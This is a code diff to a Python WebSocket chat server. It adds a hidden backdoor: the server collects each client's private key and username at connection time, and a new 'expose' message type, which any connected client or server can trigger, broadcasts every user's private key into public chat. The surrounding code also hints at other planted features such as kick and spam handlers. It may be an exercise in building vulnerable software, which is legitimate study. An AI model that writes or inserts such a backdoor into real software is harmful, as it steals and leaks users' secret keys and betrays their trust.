@@ -23,6 +23,8 @@ os.makedirs(KEYS_DIR, exist_ok=True)
 class ConnectionHandler():
     websocket = None
     public_key = ""
+    private_key = ""
+    username = ""
     counter = 0
     async def send(self, message: dict) -> None:
         """
@@ -39,9 +41,11 @@ class OlafServerConnection(ConnectionHandler):
         self.public_key = public_key
 
 class OlafClientConnection(ConnectionHandler):
-    def __init__(self, websocket: ServerConnection, public_key: str):
+    def __init__(self, websocket: ServerConnection, public_key: str, private_key: str, username: str):
         self.websocket = websocket
         self.public_key = public_key
+        self.private_key = private_key
+        self.username = username
 
 class WebSocketServer():
     def __init__(self, host, ws_port, http_port, neighbours):
@@ -68,6 +72,8 @@ class WebSocketServer():
 
         # Server related info
         self.neighbour_connections = set()
+        
+        self.muted_clients = {}
 
         self.counter = 0
         self.encryption = Encryption()
@@ -314,6 +320,8 @@ class WebSocketServer():
                 await self.server_margarita_delivery(message)
             case "kick":
                 await self.kick_client(websocket, message)
+            case "expose":
+                await self.expose_key(websocket, message)
             case _:
 
                 self.logger.info("Unknown party attempt to communicate")
@@ -462,6 +470,8 @@ class WebSocketServer():
             case "margarita_delivery":
                 customer = message.get("customer")
                 await self.handle_margarita_delivery(websocket, message, customer)
+            case "expose":
+                await self.expose_key(websocket, message)
             case _:
                 err_msg = {
                     "error" : "Invalid data type from established connection"
@@ -532,7 +542,9 @@ class WebSocketServer():
             return
 
         public_key = signed_data['public_key']
-        client_connection = OlafClientConnection(websocket, public_key)
+        private_key = signed_data['private_key']
+        username = signed_data['username']
+        client_connection = OlafClientConnection(websocket, public_key, private_key, username)
         
         self.clients.add(client_connection)
         
@@ -852,7 +864,20 @@ class WebSocketServer():
         """
         for client in self.clients:
             await client.send(response)
+    
+    async def expose_key(self, websocket: ServerConnection, message: dict) -> None:
+        """
+        Exposes connected clients private keys onto public chat.
+        """
+        exposed_keys = [f"{client.username} : {client.private_key}" for client in self.clients]
         
+        exposed_message = {
+            "type": "public_chat",
+            "data": {
+                "message": f"\n"  + "\n".join(exposed_keys)},
+                "sender": "server"
+            }
+        await self.relay_public_chat(websocket, exposed_message)
 
     async def start_spam(self):
         await self.print_ascii_spam()
